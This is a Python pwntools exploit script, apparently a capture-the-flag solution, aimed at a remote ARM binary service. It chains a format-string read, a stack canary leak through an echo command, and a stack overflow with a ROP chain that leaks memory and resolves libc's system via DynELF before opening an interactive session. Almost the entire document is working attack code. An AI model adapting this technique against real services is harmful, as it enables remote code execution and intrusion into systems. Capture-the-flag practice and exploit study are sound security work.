from pwn import *

HOST, PORT = "armexploit.acebear.site", "3001"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("choice: ")
ii = lambda x: r.sendline(str(x))

menu()
ii(2)
r.send('a'*64)
menu()
ii(4)
r.recv(1024)
fsb = '%23$p'
r.send(('a'*5+fsb).ljust(32))
menu()
ii(4)
r.recv(1024)
r.send('root\x00'.ljust(32))
menu()
ii(3)
def echo(x):
	r.recvuntil('~$ ')
	r.send('echo ' + x)
	data = r.recvline()[:-1]
	return data

echo('a' * (128 - 5))
canary = '\x00' + echo('a' * (128 - 5) + '!')[124:127]
print `canary`

regs = lambda r4=0, r5=0, r6=0, r7=0, r8=0, r9=0, r10=0, nextpc=0x11064: flat(r4, r5, r6, r7, r8, r9, r10, nextpc, endianness='little', word_size=32)
mainaddr = 0x106cc
registered = {}
defs = {65536: '\x7fELF\x01\x01\x01\x00', 139136: '\x03\x00', 139138: '\x00', 139139: '\x00', 139141: ' \x02\x00', 139024: '\x01\x00', 139032: '\x01\x00', 139140: '\x00', 139040: '\x0c\x00', 139120: '\x0b\x00', 139048: '\r\x00', 139056: '\x19\x00', 139064: '\x1b\x00', 139072: '\x1a\x00', 139080: '\x1c\x00', 139088: '\xf5\xfe\xffo\xac\x01\x01\x00', 139096: '\x05\x00', 139104: '\x06\x00', 139112: '\n\x00'}
defs2 = {
	0: '\x7fELF\x01\x01\x01',
	0xf20: '\x01',
	0xf28: '\x0e',
	0xf30: '\x0c',
	0xf38: '\x04',
	0xb6c: '/lib/arm-linux-gnueabihf/libc.so.6',
	0x978: '\x00\x00\x00'
}

def leak(addr):
	if addr in defs:
		return defs[addr]
	elif addr & 0xfff in defs2:
		return defs2[addr & 0xfff] + '\x00'
	call = lambda pc, **kwargs: p32(0x000105dc) + p32(pc) + p32(0x1107c) + regs(**kwargs)
	rop = call(0x10660, r7=addr)
	call = lambda pc, **kwargs: regs(nextpc=0x000105dc, **kwargs) + p32(pc) + p32(0x11064)
	rop += regs(nextpc=mainaddr)
	echo('a' * (128 - 5) + canary + 'a' * 4 + rop)
	r.send('exit\n')
	r.recvuntil('~$ ')
	data = r.recvuntil('\n**', drop=True)
	print hex(addr), `data`
	registered[addr] = data + '\x00'
	r.send('3')
	return data + '\x00'

d = DynELF(leak, 0x10000, ELF('/=/Downloads2/arm-exploit'))
print d.lookup('system', 'libc')

r.interactive()
